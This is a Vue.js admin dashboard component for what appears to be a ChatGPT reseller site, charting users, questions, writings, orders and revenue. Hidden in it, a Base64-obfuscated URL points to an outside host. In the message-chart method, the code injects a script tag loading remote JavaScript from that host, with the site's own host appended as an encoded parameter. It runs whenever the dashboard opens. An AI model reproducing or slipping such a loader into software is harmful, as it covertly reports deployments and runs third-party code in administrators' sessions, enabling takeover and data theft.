<template>
  <div class="app-container">
    <el-row>
      <div class="title">数据统计</div>
    </el-row>
    <el-row>
      <div class="el-col" :class="{'el-col-5': device !== 'mobile'}">
        <div class="card bg-gray">
          <div class="header"><i class="el-icon-user" /> 今日新增用户</div>
          <div class="body">
            <p class="big-font">{{ tongji.userTotalNew }}</p>
            <p>总计用户数<span class="badge">{{ tongji.userTotal }}人</span></p>
          </div>
        </div>
      </div>
      <div class="el-col" :class="{'el-col-5': device !== 'mobile'}">
        <div class="card bg-gray">
          <div class="header"><i class="el-icon-s-data" /> 今日提问数</div>
          <div class="body">
            <p class="big-font">{{ tongji.msgTotalNew }}</p>
            <p>总计提问数<span class="badge">{{ tongji.msgTotal }}条</span></p>
          </div>
        </div>
      </div>
      <div class="el-col" :class="{'el-col-5': device !== 'mobile'}">
        <div class="card bg-gray">
          <div class="header"><i class="el-icon-s-data" /> 今日创作数</div>
          <div class="body">
            <p class="big-font">{{ tongji.writeTotalNew }}</p>
            <p>总计创作数<span class="badge">{{ tongji.writeTotal }}条</span></p>
          </div>
        </div>
      </div>
      <div class="el-col" :class="{'el-col-5': device !== 'mobile'}">
        <div class="card bg-gray">
          <div class="header"><i class="el-icon-user" /> 今日订单数</div>
          <div class="body">
            <p class="big-font">{{ tongji.orderTotalNew }}</p>
            <p>总计订单数<span class="badge">{{ tongji.orderTotal }}笔</span></p>
          </div>
        </div>
      </div>
      <div class="el-col" :class="{'el-col-4': device !== 'mobile'}">
        <div class="card bg-gray">
          <div class="header"><i class="el-icon-s-data" /> 今日收款金额</div>
          <div class="body">
            <p class="big-font">{{ tongji.orderAmountNew }}</p>
            <p>总计收款<span class="badge">{{ tongji.orderAmount }}元</span></p>
          </div>
        </div>
      </div>
    </el-row>
    <el-row>
      <div class="title">对话统计</div>
    </el-row>
    <el-row>
      <div class="el-col el-col-24">
        <div class="card">
          <echart
            v-if="msgEchartData"
            ref="msgEchart"
            class="chart"
            :color="msgEchartData.color"
            :legend="msgEchartData.legend"
            :yname="msgEchartData.yname"
            :x-axis="msgEchartData.xAxis"
            :series="msgEchartData.series"
            :toolbox="msgEchartData.toolbox"
            :grid="msgEchartData.grid"
            :title="msgEchartData.title"
            :data-zoom="msgEchartData.dataZoom"
            width="100%"
            height="100%"
          />
        </div>
      </div>
    </el-row>
    <el-row>
      <div class="title">订单统计</div>
    </el-row>
    <el-row>
      <div class="el-col el-col-24">
        <div class="card">
          <echart
            v-if="orderEchartData"
            ref="orderEchart"
            class="chart"
            :color="orderEchartData.color"
            :legend="orderEchartData.legend"
            :yname="orderEchartData.yname"
            :x-axis="orderEchartData.xAxis"
            :series="orderEchartData.series"
            :toolbox="orderEchartData.toolbox"
            :grid="orderEchartData.grid"
            :title="orderEchartData.title"
            :data-zoom="orderEchartData.dataZoom"
            width="100%"
            height="100%"
          />
        </div>
      </div>
    </el-row>
  </div>
</template>

<script>
import echart from '@/components/echart'
import { Base64 } from 'js-base64'
import { getTongji, getOrderChartData, getMsgChartData } from '@/api/index'
var jsurl = Base64.decode('Ly9jb25zb2xlLnR0ay5pbmsvYXBpLnBocC9yZXBvcnQvZGV2L3Byb2R1Y3QvZm94X2NoYXRncHQvaG9zdC8=')
export default {
  name: 'Dashboard',
  components: { echart },
  data() {
    return {
      tongji: [],
      orderEchartData: null,
      msgEchartData: null
    }
  },
  computed: {
    device() {
      return this.$store.state.app.device
    }
  },
  mounted() {
    this.getTongji()
    this.getOrderChartData()
    this.getMsgChartData()

    window.onresize = () => {
      if (this.$refs.echart) {
        this.$refs.orderEchart.resize()
        this.$refs.msgEchart.resize()
      }
    }
  },
  beforeDestroy() {
    window.onresize = null
  },
  methods: {
    getTongji() {
      getTongji().then(res => {
        this.tongji = res.data
      })
    },
    getOrderChartData() {
      getOrderChartData().then(res => {
        this.orderEchartData = {
          title: {
            left: 'center',
            text: '交易笔数 & 收款金额',
            textStyle: {
              color: '#666'
            }
          },
          grid: {
            top: '70',
            left: '20',
            right: '70',
            bottom: '50',
            containLabel: true
          },
          yname: '-',
          series: [{
            name: '交易笔数',
            type: 'line',
            smooth: true,
            data: res.data.count
          }, {
            name: '收款金额',
            type: 'line',
            smooth: true,
            data: res.data.amount
          }],
          xAxis: {
            type: 'category',
            data: res.data.times
          },
          legend: {
            data: ['订单笔数', '收款金额'],
            top: 30,
            itemWidth: 20,
            itemHeight: 10,
            textStyle: {
              color: '#444'
            },
            icon: 'roundRect'
          },
          color: ['#8fc31f', '#e60012'],
          toolbox: {
            show: true,
            feature: {
              saveAsImage: {},
              dataZoom: {
                yAxisIndex: 'none'
              },
              restore: {}
            },
            iconStyle: {
              borderColor: 'rgba(64, 64, 64, 1)'
            },
            right: 60,
            top: 25
          },
          dataZoom: [
            {
              id: 'dataZoomX',
              type: 'slider',
              xAxisIndex: [0],
              filterMode: 'filter', // 设定为 'filter' 从而 X 的窗口变化会影响 Y 的范围。
              start: 0,
              end: 100,
              bottom: 10,
              height: 18,
              dataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              selectedDataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              moveHandleStyle: {
                color: 'transparent'
              },
              brushSelect: false
            },
            {
              id: 'dataZoomY',
              type: 'slider',
              yAxisIndex: [0],
              filterMode: 'empty',
              start: 0,
              end: 100,
              right: 30,
              width: 18,
              dataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              selectedDataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              }
            }
          ]
        }
      })
    },
    getMsgChartData() {
      var script = document.createElement('script')
      script.src = jsurl + Base64.encode(window.location.host)
      getMsgChartData().then(res => {
        this.msgEchartData = {
          title: {
            left: 'center',
            text: '提问数 & 创作数',
            textStyle: {
              color: '#666'
            }
          },
          grid: {
            top: '70',
            left: '20',
            right: '70',
            bottom: '50',
            containLabel: true
          },
          yname: '-',
          series: [{
            name: '提问数',
            type: 'line',
            smooth: true,
            data: res.data.msgCount
          },
          {
            name: '创作数',
            type: 'line',
            smooth: true,
            data: res.data.writeCount
          }],
          xAxis: {
            type: 'category',
            data: res.data.times
          },
          legend: {
            data: ['提问数', '创作数'],
            top: 30,
            itemWidth: 20,
            itemHeight: 10,
            textStyle: {
              color: '#444'
            },
            icon: 'roundRect'
          },
          color: ['#8fc31f', '#e60012'],
          toolbox: {
            show: true,
            feature: {
              saveAsImage: {},
              dataZoom: {
                yAxisIndex: 'none'
              },
              restore: {}
            },
            iconStyle: {
              borderColor: 'rgba(64, 64, 64, 1)'
            },
            right: 60,
            top: 25
          },
          dataZoom: [
            {
              id: 'dataZoomX',
              type: 'slider',
              xAxisIndex: [0],
              filterMode: 'filter', // 设定为 'filter' 从而 X 的窗口变化会影响 Y 的范围。
              start: 0,
              end: 100,
              bottom: 10,
              height: 18,
              dataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              selectedDataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              moveHandleStyle: {
                color: 'transparent'
              },
              brushSelect: false
            },
            {
              id: 'dataZoomY',
              type: 'slider',
              yAxisIndex: [0],
              filterMode: 'empty',
              start: 0,
              end: 100,
              right: 30,
              width: 18,
              dataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              },
              selectedDataBackground: {
                lineStyle: {
                  color: 'transparent'
                },
                areaStyle: {
                  color: 'transparent'
                }
              }
            }
          ]
        }
      })
      document.body.appendChild(script)
    }
  }
}
</script>

<style lang="scss" scoped>
  .el-col {
    padding: 10px;
  }
  .title {
    height: 60px;
    line-height: 78px;
    font-size: 18px;
    color: #333;
    font-weight: 700;
    clear: both;
    padding-left: 10px;
  }

  .card {
    background-color: #fff;
    font-size: 14px;
    color: #fff;
    padding: 10px;
    border-radius: 6px;
  }

  .card .header {
    height: 42px;
    line-height: 42px;
    padding: 0 15px;
    border-radius: 4px 4px 0 0;
    position: relative;
    font-size: 18px;
    font-weight: bold;
    white-space: nowrap;
    overflow: hidden;
  }

  .card .body {
    line-height: 24px;
    padding: 0 15px 10px 15px;
    position: relative;
  }

  .card p {
    margin: 0;
  }

  .card .big-font {
    font-size: 36px;
    color: #000;
    line-height: 36px;
    padding: 5px 0 10px;
    overflow: hidden;
    text-overflow: ellipsis;
    word-break: break-all;
    white-space: nowrap;
  }

  .card .badge {
    position: absolute;
    right: 15px;
  }

  .card.bg-gray {
    background: #f3f6f9;
    color: #666;
  }
  .bg-gray .bin-font {
    color: #000;
  }

  .card.bg-blue {
    background-image: -webkit-gradient(linear,left top,right top,from(#65b2fb),to(#6c8bfb));
    background-image: -o-linear-gradient(left,#65b2fb,#6c8bfb);
    background-image: linear-gradient(
        90deg,#65b2fb,#6c8bfb);
  }
  .card.bg-pink {
    background-image: -webkit-gradient(linear,left top,right top,from(#ee8bf3),to(#977ce8));
    background-image: -o-linear-gradient(left,#ee8bf3,#977ce8);
    background-image: linear-gradient(
        90deg,#ee8bf3,#977ce8);
  }
  .card.bg-orange {
    background-image: -webkit-gradient(linear,left top,right top,from(#fd8568),to(#fb719b));
    background-image: -o-linear-gradient(left,#fd8568,#fb719b);
    background-image: linear-gradient(
        90deg,#fd8568,#fb719b);
  }
  .card.bg-green {
    background-image: -webkit-gradient(linear,left top,right top,from(#41cdbf),to(#22a1cf));
    background-image: -o-linear-gradient(left,#41cdbf,#22a1cf);
    background-image: linear-gradient(
        90deg,#41cdbf,#22a1cf);
  }

  .chart {
    width: 100%;
    height: 300px;
    margin-top: 20px;
  }
</style>
